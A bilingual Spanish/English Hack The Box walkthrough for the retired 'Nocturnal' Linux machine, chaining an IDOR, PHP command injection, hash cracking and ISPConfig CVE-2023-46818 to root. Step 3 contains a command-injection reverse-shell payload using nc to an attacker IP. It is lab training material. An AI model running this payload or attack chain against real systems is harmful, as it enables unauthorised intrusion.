# Nocturnal [Easy]

> **ES:** Máquina Linux con app PHP de subida de ficheros: IDOR para leer backups, inyección de comandos a `www-data`, hashes SQLite craqueados y root vía ISPConfig.
> **EN:** Linux machine with a PHP file-upload app: IDOR to read backups, command injection to `www-data`, cracked SQLite hashes, and root via ISPConfig.

| Campo | Valor |
|-------|-------|
| **Dificultad** | Easy |
| **OS** | Linux |
| **Estado** | Retired |
| **Maker** | FisMatHack |
| **URL** | https://app.hackthebox.com/machines/Nocturnal |
| **IP lab** | 10.10.11.64 |
| **Fecha de resolución** | 2026-09-24 |

---

## 🎯 Objetivo / Goal

> **ES:** Conseguir `user.txt` y `root.txt` vía IDOR → panel admin → RCE, pivote a `tobias` por SSH y CVE-2023-46818 en ISPConfig.
> **EN:** Get `user.txt` and `root.txt` via IDOR → admin panel → RCE, pivot to `tobias` over SSH, and CVE-2023-46818 in ISPConfig.

---

## 🛠️ Herramientas usadas / Tools used

- [ ] nmap
- [ ] dirsearch / ffuf (rutas `admin.php`, `backups`, `uploads`, `view.php`)
- [ ] Burp (IDOR en visor/descarga de ficheros)
- [ ] sqlite3 + hashcat / john (hashes de `dump.sql`/DB)
- [ ] ssh (`tobias`)
- [ ] exploit ISPConfig CVE-2023-46818

---

## 📋 Pasos / Steps

### Paso 1 — Reconocimiento / Recon

> **ES:** Escaneo de puertos y registro de `nocturnal.htb`; la web redirige por nombre y expone login/registro.
> **EN:** Port scan and registering `nocturnal.htb`; the site redirects by name and exposes login/register.

```bash
nmap -sC -sV -p- -oN nmap_init 10.10.11.64
echo "10.10.11.64 nocturnal.htb" | sudo tee -a /etc/hosts
curl -i http://10.10.11.64/  # 302 -> http://nocturnal.htb/
```

**Resultado / Result:** 22/tcp SSH, 80/tcp nginx 1.18.0 → `nocturnal.htb`.

---

### Paso 2 — Enumeración / Enumeration

> **ES:** Fuzzing web: `login.php`, `register.php`, `admin.php→login.php`, `dashboard.php`, `view.php`, `/backups/`, `/uploads*`. Se registra un usuario y se prueba la subida (filtrado estricto).
> **EN:** Web fuzzing: `login.php`, `register.php`, `admin.php→login.php`, `dashboard.php`, `view.php`, `/backups/`, `/uploads*`. Register a user and test upload (strict filtering).

```bash
dirsearch -u http://nocturnal.htb/
ffuf -u http://nocturnal.htb/FUZZ -w wordlist -fc 403
# Imágenes locales preservadas: img/image_20250555-095548.png, img/image_20250557-095742.png, img/image_20250559-095914.png
```

**Resultado / Result:** App de subida con control de acceso débil (IDOR) en visor/descarga; `backups/dump.sql` y ficheros ajenos accesibles manipulando parámetros.

---

### Paso 3 — Acceso inicial (foothold) / Initial access

> **ES:** Con IDOR se leen ficheros de otros usuarios y el backup/SQLite con credenciales; acceso al panel admin y al código, donde se abusa una inyección de comandos para reverse shell.
> **EN:** Via IDOR read other users' files and the backup/SQLite with credentials; access the admin panel and source, where command injection yields a reverse shell.

```bash
nc -lvnp 4444 &
# view.php?id=<otro-id> / descarga con path traversal leve -> dump.sql / .db
# login admin con credencial filtrada -> ver código -> parámetro vulnerable a command injection
# payload: ; nc <tu-ip> 4444 -e bash; / $(sleep 1; ...)
```

**Resultado / Result:** Shell como `www-data`.

---

### Paso 4 — Usuario (user.txt) / User

> **ES:** Extracción de hashes de la SQLite y craqueo para SSH como `tobias`.
> **EN:** Extract hashes from SQLite and crack them for SSH as `tobias`.

```bash
find /var/www -name "*.db" -o -name "dump.sql" 2>/dev/null
sqlite3 app.db ".dump" | grep -i -A2 -B2 "tobias\|password\|hash"
hashcat -m <modo> hashes.txt rockyou.txt
ssh tobias@10.10.11.64
cat ~/user.txt  # formato parcial ofuscado
```

**Resultado / Result:** `user.txt` como `tobias` (nota local incompleta aquí; vector completado con fuentes externas).

---

### Paso 5 — Root (root.txt) / Privilege escalation

> **ES:** Se detecta ISPConfig y se explota CVE-2023-46818 para ejecución remota como root.
> **EN:** ISPConfig is detected and CVE-2023-46818 is exploited for remote execution as root.

```bash
sudo -l; ss -tlnp; cat /usr/local/ispconfig/version* 2>/dev/null
# PoC CVE-2023-46818 (language-edit / RCE en ISPConfig) -> shell root
whoami  # root
cat /root/root.txt  # formato parcial ofuscado
```

**Resultado / Result:** Técnica: RCE en ISPConfig (CVE-2023-46818).

---

## 🧠 Lo aprendido / Learned

> **ES:** IDOR en visores de ficheros, revisión de código admin para command injection y privesc vía app de hosting.
> **EN:** IDOR in file viewers, admin code review for command injection, and privesc via a hosting app.

- [ ] IDOR + backups expuestos (`dump.sql`/SQLite) para escalar a admin
- [ ] Command injection en PHP e ISPConfig CVE-2023-46818 hacia root

---

## 📚 Fuentes y Referencias / Sources

- **Fuente:** Nota local `Soluciones/Machines/unclasified/Nocturnal/index.md` (nota parcial/TODO con capturas en `img/`) — randark/nota migrada
- **Walkthrough de referencia:** Nocturnal (Easy) | Hack The Box — https://www.hackthebox.com/machines/nocturnal — HackTheBox (maker: FisMatHack)
- **Walkthrough de referencia:** HackTheBox | Nocturnal — https://benheater.com/hackthebox-nocturnal — 0xBEN
- **Fecha de acceso:** 2026-09-24
- **Autor de este walkthrough:** Apuromafo (contenido propio salvo cita; migración y normalización de la nota local, paráfrasis sin copiar literal ni publicar flags completas)

---

## ⚠️ Aviso Legal / Disclaimer

> **ES:** Uso educativo y personal únicamente. No afiliado a HackTheBox. No publicar flags de máquinas activas.
> **EN:** Educational and personal use only. Not affiliated with HackTheBox. Do not publish flags of active machines.

_Fecha de edición: 2026-09-24_
